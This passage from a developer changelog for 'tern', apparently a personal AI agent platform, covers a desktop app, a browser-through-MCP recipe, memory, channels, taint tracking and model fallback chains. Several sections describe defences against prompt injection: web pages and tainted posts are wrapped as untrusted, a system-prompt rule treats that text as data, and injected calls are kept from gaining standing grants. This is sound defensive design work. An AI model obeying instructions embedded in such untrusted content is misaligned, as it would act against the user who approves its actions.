- **`tern Tray.app`** (`scripts/package-macos-app.sh`): `tern.app/Contents/Library/LoginItems/tern Tray.app` with `LSUIElement`, id `dev.tern.ternDesktop.tray`, executable `tern-tray`. **The binary is shipped once**, there, instead of also in `Contents/Helpers` (where T8a put it): `tern-tray` with no arguments runs `tern tray` (what Login Items and Finder do), and with arguments it's the ordinary CLI. The app runs it as its `tern`; the README's CLI symlink points at it. Signed inside out (tray bundle, then the app).
- **Desktop app** (the chooser was a follow-up within T8b):
  - **First launch asks "Where should tern run?"** (deployment spec §7.1's profiles, one at a time): **On this Mac** with a **Start tern when I log in** box (ticked; it installs the service and tray), **On a tern server**, or **tern Cloud**, a disabled "coming soon" row. Everything about the hosted option is the `CloudOffer` constant in `state/connection.dart`, so turning it on is one place. Someone whose tern already starts at login isn't asked (it runs here); dismissing the question also means here, without Start at login.
  - **A server** is given as a pairing link (`tern://pair?…`, which carries the URL, code, pin and name), or as a URL plus a separate pairing code (`https://` is added if missing). A bare URL has no pin, so it only works for a server whose certificate verifies normally (`tls = "files"`); self-signed servers need the link. Redeeming uses `TernClient.pair` with the computer's hostname as the device name. A 401 says the code was wrong or expired and how to make another.
  - **The profile** (`connection: {kind: local}` or `{kind: remote, url, name, pin, device_id, scope}`) lives in `desktop.json`; **the device token never does**. On macOS it's a Keychain generic password (service `dev.tern.ternDesktop.device-token`, account = server URL) through `/usr/bin/security`, no plugin. `add-generic-password -w <token>` puts the token on that one command line for a moment, which other processes of the same user could see; accepted for now (`flutter_secure_storage` would avoid it at the cost of a plugin). Off macOS a 0600 `tokens` file beside `desktop.json` stands in until the Linux app has a keyring.
  - **`main.dart` builds the endpoint from the profile.** A server whose token is missing (Keychain reset, a copied `desktop.json`) counts as not chosen, so the chooser comes back. Switching (Settings › **Change server…** / **Run on this Mac instead**) builds a new `TernStore` for the new endpoint and disposes the old one; going back to this computer deletes the server's token.
  - **On a server, local-only controls are hidden** (§11.5 "Remote cores"): Start at login, the close-window choice, **Quit tern completely** (menu and shortcut), and **Start tern** on the offline screen, which says "Can't reach the tern server" with **Change server…** instead. Settings shows the server's name, URL and connection status. Nothing installs the service or tray for a server; the tray watching a remote core stays a TODO.
  - Multiple saved servers (gui-spec's core switcher in the sidebar footer) and the scope-based hiding of owner-only screens (§7.3) are left for later.
  - **Settings › Start tern when I log in** runs `tern service install --tray` on macOS and reads `tern service status --json` (falling back to the plist check for an older `tern`), so a login item switched off in System Settings shows unticked, and "needs approval" says where to allow it.
- **Left out, as TODO** (their backing features don't exist yet): **Needs you** (outbox/approvals in the menu, approve from a notification) needs T3; **Recent posts** and **New message…** need T2 channels and the app's `tern://` URL scheme; **Initiative** needs T1b and `PUT /v1/initiative`; **`GET /v1/clients`** (and the app not posting notifications while a tray is attached); **Restart tern to update** when `/v1/health`'s version changes; remote connection profiles (the tray only watches the local socket); and the app's Quit completely also closing the tray (it shows the stopped state instead, which §11.5a also allows).
- **Notifications deferred**: `UNUserNotificationCenter` with actions needs `objc2-user-notifications` calls that are `unsafe` and a delegate class, i.e. more than "cheap" under `forbid(unsafe_code)`, and the actions it would carry (approve, reply) are the T3 items above. The first-close notification waits with it.
- **Verified by hand** (Xcode 27.2 here now): `scripts/package-macos-app.sh` builds `tern.app` with `tern Tray.app` inside and passes `codesign --verify --deep --strict`; `tern-tray` with arguments is the CLI, and `service status --json` / `doctor` from inside the bundle query `SMAppService` without trouble. The release `tern tray` runs against a live daemon at 0% CPU idle with a **15 MB physical footprint** (RSS reads ~80 MB, mostly shared AppKit pages), right at the §11.8 budget. **Not verified**: the icon and menu on screen (no screen-recording permission in the agent session), actually registering with `SMAppService` (it changes the user's login items), whether unregistering stops a running agent (the restart in `uninstall_app` assumes it does), and approval prompts with an ad-hoc signature.

## T7a (a browser through an MCP server)

Stage 1 of the browser plan (docs/personal-agent-tooling-spec.md §9, decision 7): a recipe, [docs/recipes/browser.md](docs/recipes/browser.md), linked from the reference. No engine change.

- **Playwright MCP is the recommendation**, pinned (`@playwright/mcp@0.0.84`, not `@latest`, so `npx` doesn't run whatever was published last), with `--user-data-dir profile` under `cwd = "~/.tern/browser"` (tern expands `~` in `cwd`, not in `args`, so the profile path is relative), `--output-dir output`, `--headless` and `--no-webmcp` (pages can otherwise register tools). `browser_run_code_unsafe` goes in `disabled_tools`. **Chrome DevTools MCP** (1.12.0) is the "your own Chrome" option, `--autoConnect` on Chrome 144+, with its usage statistics and CrUX lookups turned off; the recipe says plainly that this hands over every signed-in session.
- **Effects come from T0's `effects` map**, so nothing new was needed. Playwright annotates every non-read tool `destructiveHint: true`, navigation included, which would make each page load ask with no "Always". The recipe maps navigation, tabs, hover, resize, close and media emulation to `read`; click, type, fill form, select, press key, drag and dialogs to `write`; `browser_evaluate`, `browser_file_upload` and `browser_drop` to `destructive`. Chrome DevTools MCP leaves most tools unannotated (`write` in tern, including `take_snapshot`), so it gets a `"*" = "write"` table with its own reads and destructives.
- **"Always" for an MCP tool covers every call**, so a grant for `browser_click` would also cover "Place order". The recipe says not to grant it, and to set click/type/fill/press to `destructive` on any profile that can spend money or send messages. Until T3, the user's approval is the only gate against a page's instructions; the recipe says so and suggests a `persona.md` line, as advice, not a guarantee.
- **Verified** against a scratch `TERN_HOME` with the main checkout's debug build (Node 22, Chrome installed): `tern mcp add` lists Playwright's 25 tools and Chrome DevTools MCP's 32; `GET /v1/tools` shows the overridden effects after `/v1/config/reload` (what `/reload` calls); `browser_navigate` to example.com from `cwd` launched headless Chrome with the profile and output folders created there, and `browser_snapshot` returned the accessibility tree inline. `tern mcp import` accepts `"cwd": "~"`. Not tried: a whole model-driven run with approvals, signing in to a site, `--autoConnect` against a live Chrome.
- **Follow-ups found** (not built):
  - **Untrusted MCP tools.** There is no config key to mark an MCP server's or tool's results `untrusted`; T0 left `openWorldHint` unmapped. T3 needs one (e.g. `untrusted = true` per server, or a list) before taint can cover browser pages.
  - **Argument-scoped grants.** "Always" for an MCP tool is the whole tool (`approval::pattern_for` returns `*`). An origin-scoped grant ("clicks on docs.example.com") would make the browser usable without blanket grants; belongs with T3 or T7b.
  - **`tern config set` into an inline table fails.** Once `effects` is an inline table (`effects = { … }`; `tern mcp disable`/`enable` rewrote a `[….effects]` table that way here), `tern config set mcp.servers.browser.effects.browser_hover read` errors with `"effects" … is not a table`.
  - **Hand edits need a reload.** `tern mcp restart NAME` doesn't re-read `config.toml`; `/reload` (`/v1/config/reload`) or restarting tern does. The TUI's `/reload` message still says it reloaded providers only and to restart the daemon for other settings, though it reloads MCP servers too.
  - **A missing `cwd` is reported as** "spawning `npx`: No such file or directory". Checking that the directory exists first would give a useful error.
  - **`PATH` under the app or a login item** doesn't include Volta, nvm or asdf, so `npx` from them isn't found by a service-started daemon. The recipe documents the `command` / `env.PATH` workaround; `tern doctor` could point at it.
  - **The browser reaches loopback and private addresses**, which `http_fetch` refuses. Documented, with `--blocked-origins`; T7b's native browser should apply the same rule as `http_fetch`.

## T5a (memory flush before compaction, capped profile files)

Stage 1 of docs/personal-agent-tooling-spec.md §7. Logic lives in `tern-core/src/memory.rs`; the agent calls it from one place, `Agent::compact`.

- **The flush is its own journaled step, `memory_flush`, recorded just before the `compaction` step** at the same point in the loop. Input is the compaction's `cover_through` plus a digest of the transcript being summarized, so it replays from the journal like compaction does. Replay follows the journal: a recorded `memory_flush` at that index is replayed, any other recorded kind means no flush happened there, and only the live frontier decides. So turning `[memory].flush` on or off never makes a resumed run diverge.
- **Shape**: one model call with the summarizer's transcript of the span, its own system prompt (`memory::FLUSH_SYSTEM_PROMPT`), only the `memory_save` tool, `max_tokens` 1024, no streaming to clients, and nothing added to the conversation. The host runs at most 10 of its `memory_save` calls itself (no second model turn) and records each result. "Nothing worth saving" is just a reply without calls. A call that would need approval (a user's config forcing it) is skipped, not asked.
- **It never breaks compaction.** Model errors are caught inside the step and recorded in its output (`FlushOutput.error`); the step completes and compaction goes ahead. A crash mid-flush is recorded as "interrupted; not repeated" (`InFlight::Substitute`) rather than retried, so a fact is never saved twice. Only cancellation propagates, as for every step.
- **Who flushes**: top-level runs that aren't scheduled (`parent_run_id` is null and `trigger != "cron"`), with `memory_save` registered, and `[memory].flush` on (`AgentConfig::memory_flush`, default false so tests and embedders opt in; the runtime sets it from config, default true). Sub-agents report to a parent that keeps what matters. Scheduled runs are unattended and mostly tool output, and the task said not to spend their budget on it; T1b's routines can opt in if wanted.
- **Budgets**: a run with a token budget skips the flush when used + transcript + flush prompt + 1024 would reach it. The flush's usage is journaled on the step, so a schedule's daily spend (which sums journaled usage) includes it, and it's added to the run's `outcome.usage`, so `tokens_per_run` and sub-agent budgets count it too. Compaction's own usage still isn't added to `outcome.usage` (only journaled); changing that would change the stored compaction output, so it's left as is.
- **`memory.md` is new** (`TernHome::memory_path`), injected after the "## Memory" note as "## What you remember". `user.md` keeps its "## About the user" place. Both go through `memory::read_capped`, which strips HTML comments (the templates' placeholders) and counts tokens as chars/4, the same estimate compaction uses.
- **Caps** are `[memory].user_md_tokens` and `memory_md_tokens`, 1500 each per the spec. The spec's queued `system` consolidation routine needs routines (T1b), so for now:
  - **Writes** go through a new **`profile_edit`** tool (`file`: `user`/`memory`, `mode`: `read`/`append`/`replace`). A write that would exceed the cap is refused, the file unchanged, with an error that names the cap and its config key, asks for a consolidating `replace` (merge, drop what's stale, move details to `memory_save`) and includes the current text, so the agent can consolidate in the same run. Writes are atomic (temp file and rename). `read` is a `read` effect; `append`/`replace` are host-granted writes like `memory_save` (tern's own state), `replace` idempotent. The data directory stays guarded from the file tools, so this is the only way the agent changes these files.
  - **A file edited by hand past its cap** is cut for the prompt at a line boundary, with a note naming the file and asking for consolidation with `profile_edit`; the injected text including the note never exceeds the cap (a cap too small even for the note gets the note, cut).
  - **`tern doctor`** has a Memory section: each file's size against its cap, a warning when over (with the path and the config key), and a note when the flush is off.
- **`profile_edit` is in `CHILD_EXCLUDED_TOOLS`**: persistent, user-facing changes belong to the main agent. Sub-agents still see both files in their prompt but not the "## Memory" guidance.
- **The mock provider** answers flush requests with `memory_save` calls for each of the script's `memory_flush` facts, or `NOTHING`, without consuming scripted turns.
- **Tests**: unit tests in `memory.rs` (capping, multibyte and tiny caps, refusal text, who flushes, budget), `prompt.rs` (injection within caps, sub-agent sections) and `tern-tools` (`profile_edit` modes and refusal); agent tests (flush before every compaction, silent, usage counted, replay without re-saving; a failing flush still compacts; no flush when off, without the tool, or for a scheduled run); end to end in `tests/m2.rs` (a flushed fact is found by `memory_search` in the next session; `profile_edit` refuses over the cap and doctor reports both states).
- **Later**: the queued consolidation routine (T1b), the Memory view in the app (T5), and showing a run's flushed facts in the TUI/app (they are in `tern runs show` as the step's output).

## T2 C0 (channels and posts)

Phase C0 of docs/channels-design.md §6: the store, the API, and the posts runs write. No UI yet.

- **Migration 8** is §2.2's DDL plus two things: `posts.author_id` and `messages.author_id` (below), and an index on `sessions(prev_session_id)` and `posts(reply_to)`. `posts.tainted` is there now (default 0) so C3 needs no migration.
- **Home's id is the literal `home`** (also its slug), so the API, the backfill and the code can name it without a lookup. Other channels get a UUIDv7 id; every `{id}` in the API accepts an id or a slug.
- **Backfill**: every session (sub-agent and routine sessions included, since every parent was a Home conversation) and every schedule get `channel_id = 'home'`. The newest `api` session becomes Home's `main_session_id` with `segment_reason = 'migrated'`; Telegram chats aren't the desktop's stream, so they're not picked even when newer. Without a desktop conversation Home starts with no main thread and gets one on the first send.
- **New sessions default to Home** (`Store::create_session`; `ALTER TABLE … REFERENCES` can't have a non-null default with foreign keys on, so it's done in code). Threads elsewhere use `Store::create_thread`. A sub-agent's session takes its parent run's session's channel inside `create_run`, so the sub-agent host didn't change.
- **Author identity (spec §15)**: every post has a display `author` and a stable `author_id`: `owner` for the user, `tern` for the main agent, `tern/<label>` for a sub-agent, `routine:<schedule id>` for a routine (a title can change, the schedule id can't). With multiplayer, `owner` becomes the owner's row in `members` (created with that id), other people's posts carry their member id, and agent profiles take over `tern…` ids; no migration either way. `messages.author_id` is added as well, NULL meaning the owner (user role) or the main agent (assistant role), so M0's group rooms can write `[Dana] …` authors without a schema change. Nothing writes it yet. The constants are in `tern_core::channels::author`.
- **Who posts** (§2.3), in `daemon/channels.rs`, called once per finished drive from `Manager::spawn` and again for the last day's runs at startup (`reconcile_posts`) in case a crash came between the run finishing and its post. Every write has a `dedupe_key` (`send:<run>`, `answer:<run>`), so both paths together post once.
  - A send into a topic channel: the run is started first, then the user's `message` post is keyed by its run id.
  - A top-level run in a topic channel finishing: an `answer` by `tern`, `reply_to` the send that started it (or, in a side thread started from a post, that post). A failed run posts `Failed: …`; an interrupted one posts nothing.
  - A routine's run: an `answer` by the routine into the schedule's channel (Home by default), with the routine's own session as `session_id` so reply-to-act (spec §4.3) can find it later. `NO_REPLY` posts nothing.
  - Home's own sends and answers are never posts.
- **Sends** (`POST /v1/channels/{id}/posts`): Home goes to `main_session_id` (created on first use); a topic channel to its main thread, created on first use. `reply_to` a post goes to that post's side thread if it is in one, else starts a side thread with `branched_from = 'post:<id>'`. In C0 a send still cancels a run in progress in that thread (C1 queues). `model` is accepted as on `/v1/runs`.
- **`POST /v1/runs` with `channel`** and no `session_id` starts a new thread there; `GET /v1/sessions?channel=` lists a channel's threads without sub-agent and routine sessions. `SessionItem` gains `channel_id`, `prev_session_id`, `segment_reason` and `branched_from` (omitted when empty).
- **Channel instructions** go at the end of the run's frozen system prompt as a `## Channel #slug` section (`Runtime::start_run`), so a later edit applies to the next run, not one in progress.
- **`needs_you` in `GET /v1/channels`** is, for Home, the approvals plus secret requests waiting for an API client; topic channels have 0 until C4's `needs_you` posts. `active_runs` counts top-level runs in the channel's threads.
- **Events**: `post_created {post}` and `channels_changed {}` are `Change` variants (externally tagged like `mcp_changed`). Agent events gain `channel_id` from the same per-connection run lookup that adds `session_id`.
- **Schedules**: `channel` on create and update (slug or id; an archived channel is refused), `channel_id` in the view (`home` for rows from before the migration). The `schedule_*` tools don't take a channel yet; they create in Home.
- **Tests**: `channels_repo` and migration unit tests (a version-7 database with desktop, Telegram, routine and sub-agent sessions, migrated), and `tests/t2.rs` against the daemon and the mock provider.

## T2 C1 (Home's stream)

Phase C1 of docs/channels-design.md §6: Home as one continuous chat over many sessions, and sends that queue instead of cancel.

- **Cutting** (`tern_core::channels::cut_reason`, `Manager::cut`) happens only when the user sends, and only when no run is working in the segment (that send is queued instead, below). `[home] idle_hours` (default 6, fractional allowed) and `day_starts` (`"HH:MM"`, default 04:00 local): idle wins when both apply, so the divider says the more useful thing. The last activity is the segment's newest message (or its creation), so routine posts and other background work don't keep it alive. The new segment copies the old one's source, chat ref and model, gets `prev_session_id` and `segment_reason`, and becomes Home's `main_session_id` (`channels_changed` goes out).
- **New topic cuts even mid-run.** The design says never mid-run, which is right for the automatic cuts, but an explicit New topic that silently queued into the old run would be surprising. The old run finishes in its own segment, and the carry-over lists it as open. Telegram's `/new` is the exception: it stops the run first (as before), because its answer would otherwise arrive after "New topic." in a single chat.
- **The `carry` step** (`StepKind::Carry`, `agent/carry.rs`, called from one spot at the top of the loop): step 0 of the first top-level run of a session with a `prev_session_id`; on replay, exactly when step 0 was recorded as `carry`. It summarizes the previous segment's effective context (its latest compaction summary plus what follows) in one call with `compaction::SYSTEM_PROMPT` and `SUMMARY_MAX_TOKENS`, lists runs and sub-agents still working there, and adds the last two exchanges (each run's input and final text, 2 KB in all, one line each). The rendered text is one user message (`[Continuing from your previous session (Tue 08:12–18:40). …]`). It lands after the user's own message in the session, since that was written when the run was created; the two merge into one user turn, which models handle fine.
- **The summary uses the run's own model**, not "the cheapest configured model" the design suggests: there is no notion of a cheapest model yet (that comes with T1b's gate). It is one call per segment, journaled with its usage. A failed summary call fails the run like any model call.
- **The mock provider and the test double skip carried-over summaries** when counting assistant turns (`mock-turns=` / `turns=` inside the carry message belong to another session).
- **`history_search`** (`tern-tools/src/history.rs`, read-only, idempotent): FTS over messages in the run's channel's threads except its own session, leaving out sub-agent and routine sessions, up to 20 hits with time, speaker and session id. `session_search` stays as the search over every past conversation.
- **Queue instead of cancel** (`Manager::queue_message`): a send into Home, a channel thread, or a Telegram chat while a run works there becomes `agent_mail` (`kind = message`, no sender) to that run, which its next inbox step delivers as "[message from the user to this agent]". The inbox now works without the sub-agent host (`[subagents] enabled = false`): the agent reads pending mail from the store directly, two lines in `agent.rs`. The check and the post happen under the lock a finishing run takes to leave the active map, and a run that finishes without reading its mail (it was past its last inbox check) hands it to a new run in the same thread (`follow_up_queued`; the mail is marked consumed by the new run with step `-1`). A stopped run's queue is left alone. `POST /v1/runs` with a `session_id` still replaces the run (the TUI and older apps rely on it).
- **Posts before "not active"**: a run's post is now written before it leaves the active map, so `/v1/runs/{id}/wait` returning means its post exists.
- **`GET /v1/channels/{id}/stream`** (main channels only): walks the segments back from `main_session_id`, then adds the channel's posts and side chats from the time the walked segments cover, interleaved newest first by `(created_at, kind, id)`, with a `cut` item at the start of each segment (its `carry` text folded in, the carry message itself left out) and queued messages unwrapped (`queued: true`). `next` is that sort key as a cursor. Each page re-walks from the head, which is fine at a personal stream's size. The Rust type and `tern_client`'s `StreamPage` are checked against one fixture (`test/fixtures/stream_page.json`).
- **Side chats**: `POST /v1/runs` with `channel` and `branched_from` (`message:<id>` or `post:<id>`) starts a session in that channel; it doesn't move the stream. The stream shows it as a `side_chat` item; History lists it.
- **Telegram**: each paired chat is its own stream (open question 9 stays open), cut by the same rules; `/new` is New topic; a message while a run works is queued and the gateway keeps streaming the run it already shows (`ChatHost::send` returns that run's id).
- **The `channels` health feature** tells clients the core has all this.
- **Desktop**: with `channels`, the app opens on **Home**: one `Transcript` (`TernStore.homeKey`) built from stream pages by `Transcript.fromStream`, which shares the message-to-item code with `fromSession`, so tool calls still pair with results across messages. Events of any segment in the loaded stream map to it (`transcriptOf`), including sub-agent cards and approvals. Cuts are dividers ("New session · new topic · summary carried over", click for the text), routine results are post cards, side chats are cards that open beside the stream. The composer has a **New topic** toggle (also ⌘N and the sidebar's pencil, which no longer start a separate conversation), and says a message sent while tern works will be read at its next step. Queued messages say so under the bubble. Hovering a message offers **Branch into side chat**. **History** (header) lists `/v1/sessions?channel=home` with search; entries and side chats open in a **thread pane** that takes the activity panel's place, with its own composer. Mid-run, an arriving post or the new segment's carry text marks Home stale and it is rebuilt when the run finishes (appending mid-stream would split the reply being streamed). The sidebar drops its conversation list for ⌂ Home (with a needs-you count); cores without `channels` get the old sidebar and conversation view.
- **TUI unchanged**: its `/new` still starts a plain new session (the design lists the TUI's channel commands under C5).
- **Tests**: cut rules and carry rendering (unit), the carry step's first-run-only and replay behaviour and the store-only inbox (agent tests), `history_search`, and in `tests/t2.rs` New topic with carry and history search, idle cuts, queueing in Home and in a topic channel, the stream and its paging, side chats, and Telegram `/new`. Desktop: `test/home_test.dart` (stream to transcript, Home state, sends, the view, History, a side chat).

## T3a (taint)

The taint slice of T3 (docs/personal-agent-tooling-spec.md §5.3), pulled ahead of stage 2 so channels C3 (agents reading each other's posts) can land on it. The outbox, deferred approvals and autonomy profiles stay in T3. Logic is in `tern-core/src/agent/taint.rs` and `approval::check`; the agent loop calls them at the tool step, the inbox step and the approval step.

- **The bit lives in the journal, the columns mirror it.** Migration 9 adds `runs.input_taint` (why the run started tainted; written once by `create_run`, never changed) and `runs.taint` (why it is tainted now; sticky, first reason wins, `Store::set_run_taint`). The loop never reads `runs.taint` to decide: each drive starts from `input_taint` and re-taints as it replays the steps that tainted it. That matters because taint decides whether an approval step exists at an index, so a resumed run that read the column (already tainted) would want approvals at indices where the journal has plain tool steps. `runs.taint` is for views and for other runs (children, mail readers, posts).
- **What taints, and how it is recorded:**
  - a tool result from an `untrusted()` tool: the loop sets `ToolResult.untrusted` inside the step, so it is in the step's output and a replay sees it even if config changed since. Calls that never ran (out of scope, cut off by the output limit, the crash substitute) don't taint. Errors from an untrusted tool do: an HTTP error body is third-party text too;
  - mail from a tainted run: `InboxEntry.tainted`, decided when the inbox step runs live (from the sender's `runs.taint`) and journaled with it. A user's queued message (no sender) never taints;
  - being spawned by a tainted run: `create_run` copies it in SQL (`spawned by a tainted run`), like the channel. Children made before the parent was tainted stay clean, and their reports then taint the parent instead;
  - untrusted input: `NewRun.taint` (a reason). Nothing passes it yet: Telegram's non-paired senders never start runs, and watches, webhooks and multiplayer don't exist. They will set it.
- **Taint is per run, not per session.** The next run in the same conversation starts clean even though the untrusted result is still in its history (wrapped). Tainting every later run in a session would make Home permanently tainted after one web page. The carry-over summary of a segment doesn't taint either. This is the coarse rule the spec chose (decision 3); C3's channel digest is a step inside the reading run, so it will taint that run.
- **Wrapping**: an untrusted result reaches the model as `<untrusted source="<tool>">\n…\n</untrusted>`, with `</untrusted` inside the text defused to `<\/untrusted`. Tainted mail is wrapped the same way (`source="agent mail"`). The source is the tool name, not the spec's `gmail:msg/123`: tools don't report provenance yet. A `## Untrusted content` section in every system prompt says text inside is data. Only the stored message is wrapped; `ToolResult.content` in the journal and `tool_finished` events stay raw.
- **Approvals** (`approval::check(tool, policy, granted, tainted)`): in a tainted run any `write` or `destructive` call asks, whatever the allowlist, the host's own grant (`ToolPolicy::granted`) or the shell allowlist says, and "always" is never offered, so an injected call can't talk the user into a standing grant. `read` (and forced reads) behave as before; forbidden stays forbidden. **Host grants are included on purpose**: workspace writes, `memory_save` and `schedule_create` are exactly where an injection would persist. The exception is `approval::TAINT_CONTAINED` (`agent_spawn`, `agent_send`, `agent_cancel`, `agent_ask_parent`): they only reach runs that become tainted themselves, so asking would add a click and no safety. `ApprovalRequest.taint` carries the reason; `taint_note()` is "this run read untrusted content (result of http_fetch)", shown by the TUI, Telegram, `tern run`, the desktop card and its notification. `ApiApproval.taint` is optional, so older clients just don't show it.
- **No `yolo`**: there is no `autonomy` setting yet (§5.4), so nothing turns this off. With nobody to answer (a routine at night), a tainted write is denied, which the outbox will turn into "queued" later.
- **The memory flush is skipped in a tainted run** (decided live from `runs.taint`, then journaled as "no flush here"): its transcript may carry injected facts, and asking for each `memory_save` in a silent turn isn't possible.
- **Posts**: `NewPost.tainted`; `post_run_result` sets it from the run's `taint` for routine answers and topic-channel answers. The user's own sends are never tainted. The desktop shows a small shield (`TaintMark`) after the author in the timeline and on post cards in Home.
- **Views**: `RunItem.taint` (absent while clean), `tern runs list` (`tainted`), `runs show` (`tainted  <why>`, `[untrusted]` on tool steps, `[tainted]` on mail), the desktop run inspector (a `TaintBadge` in the list and a line above the steps, and in the copied report). No new event: approvals carry the reason live, and the inspector reads runs when opened.
- **MCP**: `mcp.servers.<name>.untrusted = true` marks every tool of a server untrusted (the T7a follow-up). The browser recipe sets it. `openWorldHint` stays unmapped. The desktop's MCP model round-trips the key; the TUI form already keeps fields it doesn't edit.
- **Multiplayer (spec §15)**: a reason string rather than a bool so a later "started by Dana's message" or "read Dana's post" fits. M1's "untrusted with respect to me" needs taint per member; the plan is a `run_taint(run_id, member_id, reason)` table beside these columns, with `input_taint` as the owner's row, and `check` taking the approving member's taint. Not built.

## T6a (provider fallback chains)

Stage 1 of docs/personal-agent-tooling-spec.md (§8.3 "Provider fallback chain", §12.1).

- **Config: a model setting is a `ModelChain`**, a string or a non-empty list (`tern_core::config::ModelChain`), for `default_model`, `subagents.default_model` and `subagents.models.*`. It derefs to its first entry, so code that wants one model is unchanged, and it writes back as a string when it holds one model. Fully backward compatible: existing configs parse the same.
- **A chain belongs to its first model, not to the setting.** `Config::fallbacks_for(model)` finds the first chain (in `default_model`, `subagents.default_model`, `subagents.models` order) that starts with the run's model. So `runs.model` stays one `provider:model` (no migration, no change for the TUI, app, API or sessions), and a session `/model`, a schedule's session or `agent_spawn` that lands on that model gets the same fallbacks. A different model runs alone. Duplicated heads: the first wins and `tern doctor` warns.
- **The chain is a provider** (`tern_providers::ChainProvider`), so the agent loop barely changes: `ProviderFactory` now takes the whole `ModelRef` (it took the provider name) and the runtime's factory returns a chain when there are fallbacks. Each member gets the agent's usual retries (`MAX_LLM_ATTEMPTS`, backoff, `retry-after`) before the next; an exhausted chain returns a non-retryable error so the agent doesn't go round again. Retries inside the chain log but don't emit `AgentEvent::Retrying` (a single model, the common case, still goes through the agent's retries as before).
- **Which errors move on** (`ProviderError::moves_to_fallback`): what's retryable (5xx incl. 529, 429, 408, network, retryable stream errors such as Anthropic's `overloaded_error` at the start of a 200 stream) plus **401, 402 and 403**. Auth and billing are per provider (a revoked key, an empty OpenRouter balance), the request never ran, and the spec names auth failure, so they fall back, without retrying first. Other 4xx (400, 404, 413, 422) don't: the request is wrong and would be wrong anywhere, and a 404 means a mistyped model that doctor reports. Content refusals are successful answers, never errors, so they never fall back. Cancellation and config errors don't either.
- **A failure counts only before the answer starts.** The chain waits for each member's first stream event, so an error at the head of a 200 stream moves on. An error mid-answer goes back to the agent, which retries the call through the whole chain (as it retried one model before).
- **Journaled, so replay never re-picks.** When a later model answers, its stream starts with `StreamEvent::Fallback { model, reason }`; the assembler puts it on `AssistantTurn.fallback` (omitted when absent, so older journal rows and digests are unchanged). Replay returns the journaled turn; the llm step's input (and its digest) still names the run's model, so a resumed run matches its journal.
- **Usage is billed to the answering model.** `StepOutput::answered_by` adds `"model": "<provider:model>"` to the step's `usage_json` (llm, compaction, memory flush and carry steps), and `usage_by_model_since` groups by `COALESCE(usage.model, runs.model)`. No migration. `session_context` still reports the run's model (it sizes the context bar, which is the run's window).
- **Mid-run switches keep the transcript valid.** Messages are provider-neutral and each provider renders them, so the shapes are fine. Two fixes: Anthropic only takes tool-use ids of `[A-Za-z0-9_-]`, and some OpenAI-compatible models emit ids like `functions.read_file:0`, so `anthropic::request_body` maps other characters to `_` on both the call and its result. The chain's `max_output_tokens` is the smallest its members give (unknown for any = the agent default), so a fallback is never asked for more than it allows. Prompt caching just misses across providers.
- **Picking a model keeps the chain.** `/model` "set as default", the app's default picker and provider setup now write `chain.with_primary(model)`: the new model first, the old fallbacks behind it (minus the new one). Removing a provider drops its entries from `default_model` and clears the key only when nothing is left.
- **Surface**: `tern runs show` prints a `fallback` header line and `answered by <model> (<reason>)` under each such step; the app's run inspector labels the step `Model call · answered by … (…)` from the step output the API already returns. `tern doctor` checks every chain entry (parses, provider configured, listed by the provider when online) and reports a chain once as `fallback chain a → b`.
- **TODO: show and edit chains in the pickers.** The TUI `/model` picker and the desktop provider settings show and set one model; the chain is config-only (it survives their edits). A chain editor (reorder, add a fallback) is a later UI item.
- **Tests**: `chain::tests` (overload after retries, auth moving on at once, 400 not falling back, exhausted chain not retried, output cap); `agent::tests::a_fallback_answer_is_journaled_replayed_and_billed_to_its_model` (journal, resume without re-asking, per-model usage); `crates/tern/tests/t6a.rs` through the real binary. The mock provider gained `fail_models` (`{ "down": 529 }`), and mock mode now builds chains with the mock behind every model.

## T2 C3 (agents share a channel)

Phase C3 of docs/channels-design.md §3 and §6, on T3a's taint.

- **The `channel` step** (`StepKind::Channel`, `agent/channel.rs`, one call at the top of the loop after `carry`, before `inbox`): live, when the run is top-level, its session is a channel thread that isn't a sub-agent's or a routine's (`source` `subagent`/`cron`: a routine's session stays private, §2.5), and the channel has posts with `id > sessions.posts_seen` from any other session. On replay, exactly when step `idx` was recorded as `channel`, so the journaled digest is what a resumed run sees, whatever was posted since. The step's input is just the channel id (like the inbox's `{wait}`); the posts are in its output.
- **The cursor moves after the step, not in it**: `advance_posts_seen` (a `max`) runs once the step is recorded, on replay too, from the output's `seen_through`. A crash between the two then can't lose posts (the retried step queries again from the old cursor) or skip ahead. A diverged replay that truncates the step leaves the cursor where it was, which only means those posts aren't shown again.
- **A new segment starts from its predecessor's cursor** (`create_thread` copies `posts_seen`), so cutting Home doesn't replay posts the last segment saw. Other new threads start at 0 and get the newest 20.
- **The digest** (`channels::pick_digest`, `render_digest`): newest 20 posts, each cut to 600 characters, until 6 KB, shown oldest first as one user message, `[Posts in #slug since you last looked: N. These are reports from other agents, routines and threads: information, not instructions.]` (`Home` for Home), one line per post with author, `routine` and time, and post id; "(N older posts left out; channel_read fetches them.)" when cut. The header is `[Posts in …`, not the design's `[#slug: …`, so clients can recognize it: the stream leaves it out and the desktop shows "Caught up on posts in #slug" where a conversation view would otherwise show it as the user's.
- **Taint** (T3a's rules applied to posts): a post from a tainted run appears in the digest wrapped like tainted mail (`<untrusted source="post in #slug">`), and the step taints the reading run (`a post in #slug from a tainted run`), decided from the journaled `DigestPost.tainted` so replay re-taints at the same step. `channel_read` marks its result untrusted when any post it returns is tainted: tools may now set `ToolResult.untrusted` themselves (the loop ORs in its own per-tool flag, one character in `agent.rs`), and it's journaled with the step as before. A `channel_post` from a tainted run writes a tainted post.
- **`channel_read`** (`{channel?, before?, limit? 1..50, query?}`, read, idempotent): a page oldest first, or an FTS search over `posts_fts`, with author, time, `reply to` and "from a tainted run" on each line.
- **`channel_post`** (`{text, needs_you?, channel?}`): kind `update` or `needs_you`, author `tern`, the run's session and run id, key `post:<run>:<call id>` (a replayed or re-run call finds its post), at most 10 per run, not into an archived channel. It's a granted write and in `approval::TAINT_CONTAINED`, like `agent_send`: what it writes carries the taint on, so asking would add a click and no safety. The daemon announces the post (`post_created`) through a callback the runtime gives the tool. **Sub-agents are refused** for now (posting from sub-agents is C4), and `needs_you` doesn't yet put a pointer in Home (C4).
- **Tests**: digest bounds and framing (unit); in the agent tests, shown once then not again, replay showing exactly the recorded posts after a new one arrived, a tainted post tainting the reader (its granted write then asks, also on replay), and no digest for routine sessions; `channel_read`/`channel_post` taint, caps and idempotence; in `tests/t2.rs`, a tainted routine post in #finances reaching the main thread's digest framed, tainting it, and its own `channel_post` and answer coming out tainted, with `channel_read`'s result journaled untrusted. Two C1/C0 tests now expect the digest a new segment or side thread gets.

## T2 C4 (sub-agents posting, needs-you pointers, member lines)

